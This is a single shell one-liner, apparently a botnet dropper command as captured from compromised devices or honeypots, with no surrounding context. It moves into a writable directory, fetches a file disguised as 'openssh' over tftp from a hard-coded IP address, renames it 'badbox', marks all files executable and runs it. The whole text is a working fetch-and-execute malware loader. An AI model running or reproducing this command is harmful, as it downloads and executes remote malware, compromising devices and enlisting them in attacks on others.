cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.55.173.145 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
